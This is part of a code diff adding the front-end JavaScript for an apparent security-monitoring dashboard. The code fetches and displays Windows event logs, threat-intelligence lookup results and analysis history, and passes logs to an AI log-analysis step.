+      <div class="table-responsive">
+        <table class="table table-sm log-table mb-0">
+          <thead><tr><th>Type</th><th>Value</th><th>Malicious</th><th>Score</th></tr></thead>
+          <tbody>
+            ${d.vt_results.slice(0,10).map(r => `
+              <tr>
+                <td><span class="badge bg-secondary">${escHtml(r.type||'')}</span></td>
+                <td class="msg-cell" style="max-width:180px;" title="${escHtml(r.value||'')}">${escHtml(r.value||'')}</td>
+                <td>${r.malicious > 0 ? `<span class="badge bg-danger">${r.malicious}</span>` : '<span class="badge bg-success">0</span>'}</td>
+                <td>${r.threat_score || 0}</td>
+              </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>` : ''}
+  `;
+}
+
+function renderResult(d) {
+  const panel = document.getElementById('resultPanel');
+  const content = document.getElementById('resultContent');
+  panel.style.display = '';
+  content.innerHTML = buildAnalysisHtml(d);
+}
+
+function renderDashboardLatest(d) {
+  const container = document.getElementById('dashLatest');
+  if (!container) return;
+  if (!d) {
+    container.innerHTML = '<p class="text-muted text-center small my-3">Run an analysis to see full details and AI recommendations here.</p>';
+    return;
+  }
+  container.innerHTML = buildAnalysisHtml(d);
+}
+
+// WINDOWS LOGS
+// ════════════════════════════════════════════════
+function setPreset(val, btn) {
+  document.querySelectorAll('.log-preset').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  const wrap = document.getElementById('customLimitWrap');
+  if (val === 'custom') {
+    wrap.style.display = '';
+    logLimit = parseInt(document.getElementById('customLimit').value) || 20;
+  } else {
+    wrap.style.display = 'none';
+    logLimit = val;
+  }
+}
+
+function getSelectedChannels() {
+  return ['Security','System','Application']
+    .filter(ch => document.getElementById('chk' + ch).checked);
+}
+
+async function fetchWindowsLogs() {
+  // Validate custom limit
+  const customActive = document.querySelector('.log-preset.active')?.dataset.val === 'custom';
+  if (customActive) {
+    const raw = parseInt(document.getElementById('customLimit').value);
+    if (isNaN(raw) || raw < 1 || raw > 200) {
+      toast('Custom limit must be 1–200', 'warning');
+      return;
+    }
+    logLimit = raw;
+  }
+
+  const channels = getSelectedChannels();
+  if (!channels.length) { toast('Select at least one channel', 'warning'); return; }
+
+  document.getElementById('winLoader').style.display = '';
+  const params = new URLSearchParams({ limit: logLimit, channels: channels.join(',') });
+
+  try {
+    const data = await fetch(`${API}/logs/realtime?${params}`).then(r => r.json());
+    lastWinLogData = data;
+    renderWinLogs(data);
+  } catch (e) {
+    toast('Failed to fetch logs: ' + e.message, 'danger');
+  } finally {
+    document.getElementById('winLoader').style.display = 'none';
+  }
+}
+
+function renderWinLogs(data) {
+  const logs = data.logs || [];
+  const analyzeBtn = document.getElementById('analyzeWinBtn');
+  if (analyzeBtn) analyzeBtn.disabled = logs.length === 0;
+  document.getElementById('winCount').textContent = logs.length;
+  document.getElementById('winMeta').innerHTML =
+    `<i class="bi bi-info-circle me-1"></i>Source: <strong>${data.source || 'unknown'}</strong> | ` +
+    `Fetched: ${fmtTs(data.fetched_at)} | Channels: ${(data.channels||[]).join(', ')}`;
+
+  if (!logs.length) {
+    document.getElementById('winLogBody').innerHTML =
+      '<tr><td colspan="7" class="text-center text-muted py-4">No logs returned</td></tr>';
+    return;
+  }
+
+  document.getElementById('winLogBody').innerHTML = logs.map(ev => `
+    <tr>
+      <td style="white-space:nowrap;font-size:.75rem;">${fmtTs(ev.timestamp)}</td>
+      <td><code>${escHtml(ev.event_id)}</code></td>
+      <td><span class="badge bg-secondary">${escHtml(ev.channel||'')}</span></td>
+      <td class="small">${escHtml(ev.source||'')}</td>
+      <td>${sevBadge(ev.severity)}</td>
+      <td class="small text-muted">${escHtml(ev.computer||'')}</td>
+      <td class="msg-cell" title="${escHtml(ev.message||'')}">${escHtml(ev.message||'')}</td>
+    </tr>`).join('');
+}
+
+function buildWinLogText(data) {
+  const logs = data.logs || [];
+  const channels = (data.channels || []).join(', ') || 'unknown';
+  const header = [
+    `Windows Event Logs (${logs.length} entries)`,
+    `Source: ${data.source || 'unknown'}`,
+    `Fetched: ${fmtTs(data.fetched_at)}`,
+    `Channels: ${channels}`,
+    ''
+  ];
+
+  const lines = logs.map(ev => {
+    const msg = (ev.message || '').replace(/\s+/g, ' ').trim();
+    const parts = [
+      fmtTs(ev.timestamp),
+      ev.event_id ? `EventID=${ev.event_id}` : '',
+      ev.channel ? `Channel=${ev.channel}` : '',
+      ev.severity ? `Severity=${ev.severity}` : '',
+      ev.source ? `Source=${ev.source}` : '',
+      ev.computer ? `Computer=${ev.computer}` : '',
+      msg ? `Message=${msg}` : ''
+    ].filter(Boolean);
+    return parts.join(' | ');
+  });
+
+  return header.join('\n') + lines.join('\n');
+}
+
+function analyzeWindowsLogs() {
+  const logs = lastWinLogData?.logs || [];
+  if (!logs.length) {
+    toast('Fetch Windows logs first', 'warning');
+    return;
+  }
+
+  const payload = buildWinLogText(lastWinLogData);
+  document.getElementById('logInput').value = payload;
+  showTab('analyze');
+  analyzeLog();
+}
+
+let autoRefreshOn = false;
+function toggleAutoRefresh() {
+  const btn = document.getElementById('autoRefreshBtn');
+  if (autoRefreshOn) {
+    clearInterval(autoRefreshInterval);
+    autoRefreshOn = false;
+    btn.innerHTML = '<i class="bi bi-play-circle me-1"></i>Auto-Refresh';
+    btn.classList.replace('btn-danger','btn-outline-secondary');
+  } else {
+    fetchWindowsLogs();
+    autoRefreshInterval = setInterval(fetchWindowsLogs, 10000);
+    autoRefreshOn = true;
+    btn.innerHTML = '<i class="bi bi-stop-circle me-1"></i>Stop';
+    btn.classList.replace('btn-outline-secondary','btn-danger');
+    toast('Auto-refresh every 10s', 'info');
+  }
+}
+
+// ════════════════════════════════════════════════
+// HISTORY
+// ════════════════════════════════════════════════
+async function loadHistory() {
+  try {
+    const data = await fetch(`${API}/history`).then(r => r.json());
+    const hist = data.history || [];
+    const body = document.getElementById('historyBody');
+    if (!hist.length) {
+      body.innerHTML = '<tr><td colspan="7" class="text-center text-muted py-4">No history yet</td></tr>';
+      return;
+    }
+    body.innerHTML = hist.map(h => `
+      <tr>
+        <td>${h.id || '—'}</td>
+        <td style="white-space:nowrap;font-size:.75rem;">${fmtTs(h.timestamp)}</td>
+        <td class="fw-semibold small">${escHtml(h.threat||'Unknown')}</td>
+        <td>${riskBadge(h.risk)}</td>
+        <td>
+          <div class="d-flex align-items-center gap-1">
+            <div class="conf-bar flex-grow-1" style="width:60px;">
+              <div class="conf-bar-fill" style="width:${h.confidence||0}%;"></div>
+            </div>
+            <span class="small">${h.confidence||0}%</span>
+          </div>
+        </td>
+        <td class="msg-cell text-muted small" title="${escHtml(h.log_excerpt||'')}">${escHtml(h.log_excerpt||'')}</td>
+        <td class="small">${h.processing_time_s || 0}s</td>
+      </tr>`).join('');
+  } catch (e) { toast('Failed to load history', 'danger'); }
+}
+
+// ════════════════════════════════════════════════
+// INIT
+// ════════════════════════════════════════════════
+refreshDashboard();
+</script>
+</body>
+</html>
